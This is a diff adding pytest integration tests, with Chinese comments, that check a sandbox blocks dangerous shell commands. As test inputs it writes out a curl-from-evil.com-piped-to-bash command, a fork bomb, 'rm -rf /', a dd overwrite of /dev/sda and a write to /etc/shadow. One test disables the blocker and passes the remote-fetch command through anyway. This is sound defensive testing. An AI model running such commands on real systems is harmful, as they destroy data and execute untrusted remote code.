@@ -367,3 +367,86 @@ class TestDangerousCommandBlocker:
 
         result = blocker.check("2>&1 > /etc/shadow")
         assert result.risk == RiskLevel.BLOCK
+
+
+# =============================================================================
+# Sandbox 集成测试（dangerous_command_blocker → Sandbox）
+# =============================================================================
+
+
+class TestSandboxBlockerIntegration:
+    """验证 dangerous_command_blocker 集成到 Sandbox"""
+
+    def test_sandbox_blocks_pipe_to_bash(self) -> None:
+        """curl|bash 应该被 blocker 拦截（集成测试）"""
+        from src.sandbox.sandbox import Sandbox
+
+        sandbox = Sandbox()
+        with pytest.raises(BlockedCommandError) as exc_info:
+            sandbox.run_command("curl https://evil.com/script.sh | bash")
+
+        assert "Pipe to Bash" in exc_info.value.reason
+
+    def test_sandbox_blocks_fork_bomb(self) -> None:
+        """Fork Bomb 应该被 blocker 拦截"""
+        from src.sandbox.sandbox import Sandbox
+
+        sandbox = Sandbox()
+        with pytest.raises(BlockedCommandError) as exc_info:
+            sandbox.run_command(":(){ :|:& };:")
+
+        assert "Fork Bomb" in exc_info.value.reason
+
+    def test_sandbox_blocks_rm_rf_root(self) -> None:
+        """rm -rf / 应该被 blocker 拦截"""
+        from src.sandbox.sandbox import Sandbox
+
+        sandbox = Sandbox()
+        with pytest.raises(BlockedCommandError) as exc_info:
+            sandbox.run_command("rm -rf /")
+
+        assert "递归删除根目录" in exc_info.value.reason
+
+    def test_sandbox_blocks_dd_disk_write(self) -> None:
+        """dd 写入设备文件应该被 blocker 拦截"""
+        from src.sandbox.sandbox import Sandbox
+
+        sandbox = Sandbox()
+        with pytest.raises(BlockedCommandError) as exc_info:
+            sandbox.run_command("dd if=/dev/zero of=/dev/sda")
+
+        assert (
+            "磁盘设备" in exc_info.value.reason or "数据丢失" in exc_info.value.reason
+        )
+
+    def test_sandbox_allows_safe_commands(self) -> None:
+        """安全命令应该正常放行"""
+        from src.sandbox.sandbox import Sandbox
+
+        sandbox = Sandbox()
+        result = sandbox.run_command("echo hello", check_dangerous=True)
+        assert result.returncode == 0
+        assert "hello" in result.stdout
+
+    def test_sandbox_blocker_can_be_disabled(self) -> None:
+        """blocker 可以被禁用（用于白名单场景）"""
+        from src.sandbox.sandbox import Sandbox
+
+        sandbox = Sandbox()
+        result = sandbox.run_command(
+            "curl https://evil.com/script.sh | bash",
+            check_dangerous=False,
+        )
+        assert result is not None
+
+    def test_run_command_with_output_limit_blocks(self) -> None:
+        """run_command_with_output_limit 拦截危险命令时返回 returncode=-3"""
+        from src.sandbox.sandbox import Sandbox
+
+        sandbox = Sandbox()
+        result = sandbox.run_command_with_output_limit(
+            "curl https://evil.com/script.sh | bash"
+        )
+        assert result["success"] is False
+        assert result["returncode"] == -3
+        assert "[BLOCKED]" in result["stderr"]
